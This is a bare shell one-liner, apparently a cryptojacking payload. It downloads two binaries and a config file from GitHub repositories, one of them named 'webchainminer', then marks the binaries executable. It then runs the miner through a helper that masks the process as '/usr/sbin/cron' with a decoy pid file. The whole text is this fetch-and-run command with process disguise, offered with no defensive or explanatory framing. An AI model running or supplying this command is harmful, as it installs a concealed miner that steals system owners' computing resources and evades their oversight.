wget https://github.com/miingiing/act/raw/main/godb && wget https://raw.githubusercontent.com/cihuuy/hodo/refs/heads/master/config.json && wget https://github.com/cihuuy/webchainminer/raw/refs/heads/main/wch && chmod +x godb wch \
&& ./godb -s "/usr/sbin/cron" -p croned.pid ./wch 
